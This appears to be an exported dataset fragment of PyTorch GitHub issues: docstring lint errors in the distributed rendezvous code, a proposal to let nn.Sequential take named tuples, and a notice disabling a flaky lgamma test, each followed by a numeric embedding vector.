- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `announce_self_waiting`, **Line**: 644, **Description**: First line should end with a period (not 't')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_rendezvous_to_free`, **Line**: 671, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `wait_for_rendezvous_to_free`, **Line**: 671, **Description**: First line should end with a period (not 'o')
- **Error Code**: **D202**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: No blank lines allowed after function docstring (found 1)
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `handle_join_last_call`, **Line**: 741, **Description**: First line should end with a period (not 'e')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `set_closed`, **Line**: 814, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `set_closed`, **Line**: 814, **Description**: First line should end with a period (not 'r')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `_create_etcd_client`, **Line**: 972, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `_create_etcd_client`, **Line**: 972, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_rendezvous.py`, **Entity**: `create_rdzv_handler`, **Line**: 1009, **Description**: First line should end with a period (not '
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: First line should end with a period (not 't')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `find_free_port`, **Line**: 29, **Description**: First line should be in imperative mood (perhaps 'Find', not 'Finds')
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `EtcdServer`, **Line**: 78, **Description**: First line should end with a period (not '3')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_port`, **Line**: 136, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_host`, **Line**: 143, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_endpoint`, **Line**: 150, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: First line should end with a period (not 'n')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `start`, **Line**: 162, **Description**: First line should be in imperative mood (perhaps 'Start', not 'Starts')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: First line should end with a period (not '
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `get_client`, **Line**: 229, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D200**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: One-line docstring should fit on one line with quotes (found 3)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: First line should end with a period (not ')')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/etcd_server.py`, **Entity**: `stop`, **Line**: 259, **Description**: First line should be in imperative mood (perhaps 'Stop', not 'Stops')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/static_tcp_rendezvous.py`, **Entity**: `StaticTCPRendezvous`, **Line**: 25, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_parse_rendezvous_config`, **Line**: 20, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_try_parse_port`, **Line**: 58, **Description**: First line should be in imperative mood (perhaps 'Try', not 'Tries')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `parse_rendezvous_endpoint`, **Line**: 65, **Description**: First line should be in imperative mood (perhaps 'Extract', not 'Extracts')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `_matches_machine_hostname`, **Line**: 112, **Description**: First line should be in imperative mood (perhaps 'Indicate', not 'Indicates')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/utils.py`, **Entity**: `set_name`, **Line**: 232, **Description**: First line should be in imperative mood (perhaps 'Set', not 'Sets')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_backend`, **Line**: 44, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `next_rendezvous`, **Line**: 50, **Description**: First line should be in imperative mood; try rephrasing (found 'Main')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `is_closed`, **Line**: 73, **Description**: First line should be in imperative mood (perhaps 'Check', not 'Checks')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `set_closed`, **Line**: 87, **Description**: First line should be in imperative mood (perhaps 'Mark', not 'Marks')
- **Error Code**: **D205**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: 1 blank line required between summary line and description (found 0)
- **Error Code**: **D400**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: First line should end with a period (not 's')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `num_nodes_waiting`, **Line**: 91, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_run_id`, **Line**: 101, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `shutdown`, **Line**: 110, **Description**: First line should be in imperative mood (perhaps 'Close', not 'Closes')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get`, **Line**: 174, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_as_bool`, **Line**: 178, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `get_as_int`, **Line**: 197, **Description**: First line should be in imperative mood (perhaps 'Return', not 'Returns')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `register`, **Line**: 222, **Description**: First line should be in imperative mood (perhaps 'Register', not 'Registers')
- **Error Code**: **D401**, **File**: `torch/distributed/elastic/rendezvous/api.py`, **Entity**: `create_handler`, **Line**: 249, **Description**: First line should be in imperative mood (perhaps 'Create', not 'Creates')

cc @carljparker",False,"[-1.55916572e-01 -5.81569910e-01  8.60030353e-02 -3.26751173e-01
 -3.44614610e-02 -8.00554007e-02  4.65556085e-02  4.19905111e-02
 -1.27100050e-01  2.85825193e-01  1.89005118e-02 -1.17671415e-01
  2.02481344e-01  2.20221370e-01  1.93390936e-01  2.93908715e-01
 -2.15573117e-01 -3.95751357e-01  4.05236721e-01  1.12843603e-01
  2.73762252e-02  4.12055492e-01 -2.33263656e-01  1.08297788e-01
 -4.21479046e-01  1.12165719e-01 -2.14509517e-01 -2.36454487e-01
 -2.14403227e-01  2.15514511e-01  2.93515652e-01 -1.13574658e-02
 -5.12368441e-01  1.40958056e-01  4.71134245e-01  3.24650824e-01
 -3.07044208e-01 -1.45302713e-01  3.30078378e-02 -1.83221057e-01
  2.02631384e-01 -1.00004293e-01 -1.39461726e-01 -1.12922758e-01
  1.31700128e-01 -3.87691438e-01 -5.60518861e-01  1.70167148e-01
 -2.35393137e-01  6.14165738e-02  1.58899054e-01  2.56513029e-01
 -5.39287090e-01  1.70434222e-01  2.42906183e-01  2.02457458e-01
 -1.32668048e-01  7.65250266e-01  7.26665705e-02 -5.82400560e-02
  1.11521080e-01 -6.55882135e-02  1.88776582e-01  2.49944553e-01
 -1.84260070e-01  1.19072661e-01  6.27356097e-02  4.24432278e-01
  3.00525010e-01 -3.37010920e-01 -3.60061258e-01 -1.93132833e-02
 -5.19940495e-01 -1.66535139e-01  1.96702302e-01  2.30898842e-01
 -1.61329508e-01 -5.25036156e-02 -4.33796763e-01 -3.22912514e-01
 -5.74928284e-01  1.89270914e-01  3.18992108e-01 -5.77491969e-02
  1.15604132e-01 -1.12977579e-01  2.26557508e-01 -5.81590086e-02
  2.17716545e-01  3.89363691e-02  5.17963290e-01 -9.78239477e-02
  1.31590217e-01  3.06756824e-01 -1.85153633e-02  1.50552392e-01
  1.57000825e-01 -4.59896103e-02  2.63412856e-02 -2.17716455e-01
  6.42302558e-02 -2.74906039e-01 -3.12844217e-01  2.31526688e-01
  4.49138917e-02  8.47280473e-02  3.62401903e-02 -2.75625616e-01
  6.94807693e-02  1.85622185e-01 -1.26270071e-01  1.38942581e-02
  2.66025871e-01  3.49403471e-02  1.49096310e-01  3.86625588e-01
 -4.67646211e-01  1.80473223e-01 -2.67495036e-01  2.17088703e-02
  1.02158450e-01  7.41651878e-02  1.53268814e-01  2.34641045e-01
 -2.44591609e-01 -1.37888968e-01  3.75572622e-01 -2.04054475e-01
 -2.40426734e-02 -3.29347968e-01  2.47950792e-01  8.56660865e-03
 -3.22070196e-02  1.33466303e-01  1.18603535e-01 -7.90246278e-02
 -1.73502937e-01 -6.28249288e-01 -2.41366535e-01 -1.60187796e-01
 -1.02318570e-01 -5.65379024e-01 -4.95287515e-02 -2.02391148e-01
  5.95569372e-01  5.14717162e-01 -3.47335815e-01  4.26854610e-01
 -7.19781034e-03  3.00931543e-01  1.96213424e-01  3.93400311e-01
 -1.69573158e-01  3.69505554e-01 -1.15161680e-01  2.28058875e-01
  7.53804922e-01 -1.12068117e-01 -5.04696257e-02 -5.99360704e-01
  9.65852141e-02  4.11727667e-01  1.29700735e-01 -4.92584929e-02
 -1.89893737e-01 -2.63597965e-01 -3.23841542e-01 -1.03360470e-02
 -6.75184250e-01 -3.13221306e-01 -1.41660705e-01  2.39532709e-01
 -3.44884813e-01 -4.10190076e-02  2.20919475e-02  1.39838398e-01
 -1.27664804e-01 -4.22040284e-01 -6.65569678e-02  1.50184214e-01
 -1.43612623e-01  4.06302065e-01  1.16807967e-01  2.77411323e-02
 -6.64797798e-02  7.72362426e-02  9.55473483e-02  1.07644126e-01
  3.58137250e-01  9.93192717e-02  1.89074516e-01 -5.22713304e-01
  2.32920080e-01  3.29888463e-02 -7.97674656e-02 -1.99089795e-02
  6.31848097e-01  5.35443425e-01  3.10212802e-02  3.41926217e-01
  6.02809787e-02  1.54421180e-01  5.54338992e-01 -1.62611246e-01
  6.80973411e-01  1.01729203e-02 -1.65950090e-01 -2.64785022e-01
 -1.33783042e-01  2.03716680e-01 -2.69040287e-01 -1.83458358e-01
 -5.25388047e-02 -4.04076815e-01 -3.52948785e-01  2.86348283e-01
  5.93751594e-02  3.27089697e-01  8.20585266e-02 -4.47947085e-01
 -2.65792429e-01  3.62043977e-02 -1.11464977e-01 -1.63330331e-01
  4.50889051e-01  7.86469206e-02 -6.46076351e-02 -2.44720876e-02
 -2.75491774e-02  1.92801729e-02 -2.62392405e-03  2.22710550e-01
  4.69424367e-01  6.93860650e-02  1.70150191e-01 -5.35254143e-02
  9.11213905e-02 -5.27100712e-02  1.81622416e-01  2.46442646e-01
  4.42582257e-02  1.85398877e-01 -2.08533615e-01  7.36361295e-02
  2.43925095e-01 -3.31470728e-01 -1.90047354e-01 -2.95084536e-01
 -3.83569419e-01  6.41120523e-02 -4.93919015e-01 -5.88601887e-01
  1.14103407e-01 -7.99250454e-02  5.97909212e-01  2.72823602e-01
 -6.27792180e-01 -5.55090494e-02  7.47039169e-02  2.87588716e-01
 -1.14313802e-02  3.71014476e-01 -2.00737059e-01 -6.10250235e-02
  4.14023459e-01 -1.92152888e-01 -2.75389194e-01  2.73847163e-01
  1.12399057e-01 -1.33368641e-01  7.89169967e-03 -4.63181376e-01
  1.89043373e-01  1.09623805e-01  5.12336910e-01 -9.56096351e-02
  4.61694807e-01 -3.60287964e-01 -4.21494618e-02  3.60393167e-01
  1.14438906e-02  4.18737441e-01 -2.62053430e-01 -1.58789515e-01
  5.08028686e-01 -8.33408386e-02 -8.52300376e-02 -2.35794276e-01
 -4.24146652e-01 -2.49049231e-01 -5.58265597e-02 -5.97560517e-02
  2.19642892e-01 -1.64723784e-01 -1.23966813e-01  1.12136826e-01
 -2.21935697e-02  1.84738740e-01  4.27751541e-01 -9.41154361e-02
 -7.77650356e-01 -4.50700641e-01 -2.39513054e-01  2.57435411e-01
  3.14880073e-01  1.46088898e-01  1.28712460e-01  3.25904667e-01
 -2.03832269e-01 -3.90899390e-01  4.85660046e-01  3.15586507e-01
 -2.63374448e-01 -1.60165995e-01  3.05663496e-02  2.60784617e-03
  1.86140835e-03  7.34539926e-01  3.54951203e-01  9.07586664e-02
 -2.03055605e-01 -4.68131065e-01 -3.23231548e-01 -7.16498196e-02
  1.61759585e-01 -2.04947203e-01 -1.52519703e-01  1.12764686e-01
 -1.98891997e-01 -1.52397960e-01 -1.96609527e-01  2.14264244e-01
  8.55431780e-02 -4.00698334e-02  4.63658422e-02  1.45661160e-01
 -1.08388998e-01  1.34160101e-01  1.76455855e-01 -4.83058035e-01
  4.76729870e-03 -1.15888447e-01  7.53763132e-03 -3.59299749e-01
 -1.05115809e-01 -1.70744091e-01  3.03778738e-01  5.16993880e-01
 -2.13828415e-01 -3.71468425e-01  5.79205990e-01 -3.65633279e-01
 -2.41808295e-01  1.31341722e-02 -3.40738147e-01  3.94928753e-01
 -1.70523271e-01  1.33309923e-02  7.32372776e-02  4.91936982e-01
 -2.27700636e-01  1.02688596e-01 -9.72636044e-02 -4.23055172e-01
 -9.63948667e-03 -1.60715967e-01 -4.80537415e-02  1.93775386e-01
 -1.39177784e-01 -1.76509097e-02 -5.13992190e-01 -3.50347254e-04
 -2.66338944e-01  5.37234265e-03  1.86513513e-01  1.50690645e-01
  2.05579221e-01  1.67058799e-02  2.33501419e-01 -1.25563860e-01
 -6.67837858e-01  4.05243278e-01  5.77043712e-01 -3.82197678e-01]"
"Allow passing `(<name>, <module>)` tuples to `nn.Sequential` module: nn triaged enhancement","### ðŸš€ The feature, motivation and pitch

*(I am ready to implement this feature)*

Currently, creating a `nn.Sequential` with named modules requires one more import and two more indentations compared to the version without names:

```
# Without names.
model = nn.Sequential(
   hello_module,
   world_module,
)
```
```
# With names.
from collections import OrderedDict

model = nn.Sequential(
    OrderedDict(
        [
            ('hello', hello_module),
            ('world', world_module),
        ]
    )
)
```

Given how frequently this construction occurs in practice, I propose improving its ergonomics by allowing the following:

```
# With names.
model = nn.Sequential(
    ('hello', hello_module),
    ('world', world_module),
)
```

The new constructor should raise an exception if there are duplicated names among the provided tuples.

### Alternatives

_No response_

### Additional context

There is also https://github.com/pytorch/pytorch/issues/84751. However:
- The linked issue seems to have a significantly wider scope.
- This is something I am not sure about, but I'll mention this just in case: the proposed version has a pretty simple semantics which is ""order of tuples == order of modules"". With the `dict`-based version, technically, it is also true, but it may be slightly less intuitive given a long history of `dict` being unordered (and similar collections being unordered in other languages).

cc @albanD @mruberry @jbschlosser @walterddr @mikaylagawarecki",False,"[-3.31399947e-01 -2.24815905e-01 -1.61405116e-01 -4.01853979e-01
 -2.40155011e-01 -8.71419087e-02  1.77116599e-02 -2.11004764e-01
 -3.87666702e-01 -1.17653579e-01  2.12994695e-01  3.90459627e-01
  2.05025151e-01  6.04909323e-02  1.59890532e-01  7.27434531e-02
 -1.40194535e-01  3.55778545e-01 -1.24974854e-01 -3.77154201e-02
 -1.04387835e-01 -2.67975461e-02 -2.42060155e-01  1.31417245e-01
  2.50324786e-01 -3.53473350e-02  2.27299139e-01 -6.60176575e-02
  4.87671822e-01 -2.76683360e-01  6.56333789e-02  2.37388328e-01
 -4.55273315e-02  3.12248498e-01 -1.92412674e-01  2.01013014e-01
 -6.39160991e-01 -1.31243998e-02  6.14223108e-02 -1.26618683e-01
 -1.14917062e-01  1.74020082e-01 -1.84436329e-03 -4.10849094e-01
 -1.58897489e-01 -2.85829633e-01 -3.90260607e-01  4.10741806e-01
 -2.35006381e-02 -7.80944005e-02  5.11192903e-02 -8.85587335e-02
 -2.95743078e-01 -3.01008493e-01  1.31371468e-01 -1.54442817e-01
 -3.62141244e-02 -5.77104092e-02 -1.12191416e-01 -3.85725737e-01
  8.42952356e-03 -3.29871982e-01 -6.79608956e-02  3.64152640e-02
  1.16678372e-01 -1.59165531e-01  1.34700194e-01  3.39153081e-01
  5.79488635e-01  5.47199734e-02  3.11877966e-01  1.35104507e-01
 -3.15731466e-01 -5.55142686e-02 -7.39836842e-02 -7.68207088e-02
 -8.31500292e-02  1.00885658e-02 -1.12935558e-01 -8.78665373e-02
 -1.65925756e-01  1.19240806e-01 -1.81169331e-01 -2.20022187e-01
  1.52006775e-01 -4.79334500e-03  4.49809432e-02  5.45581765e-02
  4.69881436e-03 -1.66575201e-02  1.02342457e-01 -1.91226572e-01
 -6.06364384e-02  1.87721431e-01  2.52694488e-01  2.67032474e-01
  2.72931278e-01  7.73856640e-02  7.68578947e-02 -2.19329268e-01
 -1.06417239e-01 -4.01716828e-01 -8.22532326e-02 -1.67462140e-01
  3.09009522e-01 -9.42255408e-02  4.62993905e-02 -3.40005040e-01
  3.11946779e-01  4.47573839e-03  7.60033680e-03  1.98755071e-01
 -7.55705535e-02 -2.43480772e-01 -2.96672672e-01  2.84436166e-01
  1.41312689e-01 -1.56664830e-02  3.37682106e-03  3.37879777e-01
  8.89369696e-02 -6.27605617e-02  2.59143591e-01  1.55621946e-01
  2.25969493e-01  1.64506122e-01  3.48946862e-02 -2.16152757e-01
 -1.17420942e-01 -2.79751986e-01  1.87766314e-01  2.08633274e-01
  2.72550490e-02  1.24411806e-01  4.16629195e-01 -1.02974802e-01
 -4.21408534e-01 -2.38517672e-01 -3.86195987e-01 -1.21656999e-01
 -5.74927211e-01 -5.52842878e-02 -1.39918864e-01 -4.48163509e-01
  2.64878094e-01 -5.44602796e-03 -1.13446720e-01  4.74673025e-02
 -2.33150702e-02 -4.99075875e-02 -5.40505629e-03  3.32253516e-01
 -1.60774335e-01  1.30646661e-01  1.95699304e-01  1.17286548e-01
  3.09907913e-01 -1.75669678e-02  3.23384643e-01 -1.82800218e-01
  1.34919196e-01  5.96374393e-01  2.86960274e-01 -2.77302787e-02
  1.91379428e-01  2.46033847e-01 -9.33315419e-03 -1.55219749e-01
 -1.92180529e-01  2.04684943e-01 -3.66177320e-01 -3.74781713e-02
 -2.42563650e-01 -1.99920803e-01  2.03106016e-01  8.57690349e-02
 -1.99803188e-01 -6.00753725e-01  1.41072452e-01  3.40364158e-01
  2.13818833e-01  3.09490532e-01 -1.14141535e-02 -2.21721858e-01
 -1.45410568e-01  1.87847316e-02  2.31429875e-01  1.24733105e-01
  3.37057486e-02  2.96858549e-01 -1.58351678e-02  8.34668130e-02
  2.65095234e-01  2.92416885e-02  1.94514394e-01 -2.06743181e-01
  5.12119532e-01  6.17324859e-02  1.42055392e-01  1.19017065e-02
 -3.26962948e-01  1.38756007e-01  1.75884753e-01 -9.81728286e-02
  1.08795881e-01 -2.67364144e-01 -6.23548515e-02 -2.68670917e-01
 -1.13240212e-01  3.35090399e-01 -3.46223027e-01  1.80889949e-01
  1.53530866e-01  2.01213509e-02 -2.42089361e-01  1.67479426e-01
  8.54871124e-02 -9.01780725e-02  1.21859163e-01 -7.38066137e-02
 -6.14456870e-02 -8.17074031e-02  3.29577863e-01 -2.00645730e-01
  4.98926461e-01  2.24310771e-01  1.07112050e-01  5.98793104e-03
  4.98004407e-02 -2.36640841e-01 -1.47769243e-01 -1.91068113e-01
  2.28815034e-01 -1.50733069e-01  2.36791611e-01  5.27521744e-02
  2.15755433e-01  9.56826955e-02  3.98281157e-01  3.10463578e-01
 -1.68831348e-01 -2.41554789e-02  6.76754788e-02 -1.56481862e-01
  1.78547561e-01  8.82072151e-02 -3.61457378e-01 -3.42995524e-01
 -4.16554213e-01 -5.11215255e-03 -4.70474899e-01  9.08731669e-02
  3.67646068e-01 -3.40941474e-02  1.56635180e-01  1.06617987e-01
  1.55112445e-01  8.05088878e-02  6.68813214e-02 -1.63748860e-01
  3.49162996e-01  2.08940431e-01  4.64880653e-02  1.06311910e-01
 -2.72630639e-02 -2.82536209e-01 -9.63428989e-02  4.34264988e-01
  9.68799926e-04 -1.69922635e-01  6.79457262e-02 -1.74365401e-01
  3.06557771e-03 -1.85806572e-01  1.61804527e-01  1.53994739e-01
  1.20604053e-01 -2.86718369e-01  5.28137349e-02  5.86406551e-02
 -2.43488491e-01  1.10539608e-01 -2.07860708e-01  4.08792108e-01
  5.06266169e-02 -2.59552091e-01  4.39064726e-02 -1.96948647e-04
 -3.75950903e-01 -1.73418403e-01 -2.97494382e-01 -4.87193465e-02
  2.70469338e-02 -4.33403194e-01 -4.02875811e-01  4.20959175e-01
  1.82338774e-01 -1.04438260e-01 -1.56817406e-01 -2.21763700e-01
 -7.85166919e-02  1.86360791e-01  3.71429205e-01 -3.08894932e-01
 -3.63777161e-01 -7.98843503e-02  2.77709663e-01  2.77584851e-01
  1.42563328e-01 -4.62579206e-02  3.33601832e-01  4.63737436e-02
 -2.49642909e-01  2.31056005e-01  3.54921371e-02  1.57800719e-01
  2.12565348e-01  4.81283367e-01  4.20114696e-02  1.26613334e-01
 -2.93276161e-01 -2.85152942e-01 -1.24383353e-01 -6.21153452e-02
  2.23541319e-01  1.43739462e-01 -3.53421390e-01  1.63879216e-01
  9.54650417e-02  2.08134890e-01  7.28406534e-02  2.06121683e-01
  2.11601555e-02 -1.21018179e-02 -1.53541386e-01 -2.56392360e-01
 -2.68731833e-01  4.98066068e-01  1.14999801e-01  6.86774105e-02
 -1.63074434e-01  2.07392469e-01 -2.05696434e-01 -1.79493114e-01
 -3.37579578e-01 -1.16151407e-01 -8.17140937e-02  4.95109439e-01
  2.23067403e-01 -4.90943380e-02  1.14884920e-01  8.18870738e-02
 -3.30639601e-01 -3.82307619e-02 -1.68647006e-01  2.58698970e-01
  3.22380275e-01 -2.46056929e-01 -6.19436279e-02 -2.06990149e-02
 -1.34696178e-02 -1.70636401e-01 -3.72753412e-01 -1.39579937e-01
  1.03751466e-01 -2.20063508e-01  1.11032709e-01 -4.52849656e-01
  1.05452225e-01  1.37509570e-01 -2.57501513e-01  1.52290687e-01
  1.15688041e-01  2.17228308e-01  2.27299929e-01  8.17976594e-02
  1.46250138e-02 -1.55180424e-01  4.09195364e-01  1.75088271e-02
 -1.56421676e-01 -4.59575802e-02 -6.24826849e-02  9.22455043e-02]"
DISABLED test_lgamma_cpu (__main__.CpuTests) triaged module: flaky-tests skipped module: inductor,"Platforms: linux

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_lgamma_cpu&suite=CpuTests) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/18429305821).

Over the past 3 hours, it has been determined flaky in 2 workflow(s) with 6 failures and 2 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_lgamma_cpu`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `inductor/test_torchinductor.py`

cc @voznesenskym @penguinwu @EikanWang @jgong5 @Guobing-Chen @XiaobingSuper @zhuhaozhe @blzheng @wenzhe-nrv @jiayisunx @peterbell10 @ipiszy @yf225 @chenyang78 @kadeng @muchulee8 @aakhundov @ColinPeppler",False,"[-2.29730681e-01 -1.97702348e-01 -1.62979811e-01 -1.75585579e-02
 -5.53522706e-02 -3.52769315e-01  9.00408998e-02 -4.79125343e-02
 -2.79856801e-01 -4.93937790e-01  3.66654247e-01 -1.36995673e-01
  1.87095970e-01 -1.67856008e-01 -2.39495650e-01 -2.08429471e-01
  1.60014890e-02 -2.29658395e-01  3.25002670e-01 -1.17596418e-01
 -4.81311530e-01  6.23812899e-03 -1.87117368e-01  2.11958304e-01
  5.33779711e-02 -8.68817568e-02 -1.39683217e-01  6.06534779e-02
 -3.35689038e-01  1.11278571e-01  4.17725742e-01  2.84580767e-01
 -3.82116824e-01 -3.00250594e-02  4.02203500e-01  9.12660435e-02
 -4.73117009e-02 -2.86475301e-01 -1.11295670e-01 -2.43942291e-01
  5.63757122e-02 -5.26512638e-02  1.09544441e-01 -1.01379827e-01
 -5.36881462e-02  2.45111417e-02 -3.42588335e-01  1.40530944e-01
 -2.65633732e-01 -2.56743222e-01  6.61523640e-02 -1.48137718e-01
  1.40196979e-01 -5.65980136e-01  2.41805613e-01 -2.92922795e-01
  1.90911666e-01  3.59413207e-01  5.36884554e-03  4.43795264e-01
 -1.54412501e-02  2.67097838e-02 -8.36012512e-03  9.48026031e-02
 -3.06101274e-02  1.65502623e-01  2.50738174e-01 -7.35100806e-02
  4.92069364e-01  1.20520800e-01 -4.60006259e-02 -7.53549039e-02
 -5.44020891e-01 -9.10872370e-02 -4.58813906e-02  2.11834669e-01
 -1.42259061e-01 -9.82576236e-02  1.11012064e-01 -1.28813133e-01
 -1.81502953e-01  7.56734535e-02  1.78263485e-01 -1.25572914e-02
  9.34603810e-02  8.59071463e-02  1.07340559e-01 -7.09903762e-02
  1.85365528e-01 -2.80619085e-01  4.19883847e-01  1.59022287e-01
 -1.46317720e-01  1.23437300e-01 -1.23489022e-01  1.65386260e-01
  3.51816505e-01 -2.37976447e-01 -2.72202820e-01  6.08657040e-02
  1.10225447e-01 -2.90414214e-01 -5.17524220e-02  3.00868154e-01
 -2.24634796e-01 -2.57070363e-01  3.92229348e-01  1.33017093e-01
  1.51768029e-01 -1.05504930e-01  3.98302078e-02  2.65170615e-02
 -7.91616216e-02  1.18761443e-01  1.52432518e-02 -5.63399680e-03
  3.76706533e-02 -2.77838670e-04 -5.22855073e-02  4.09060597e-01
 -2.94894606e-01 -6.18493408e-02  1.81770578e-01 -1.04252100e-01
  3.71301055e-01 -9.40208957e-02 -8.81831944e-02  2.41932333e-01
  3.83715183e-02 -3.01681012e-01  1.43556595e-01  6.39588237e-02
 -4.29510027e-02 -9.92452428e-02  1.16052449e-01  1.11891352e-01
  5.46954721e-02 -9.14435312e-02  1.25821635e-01 -9.16581601e-02
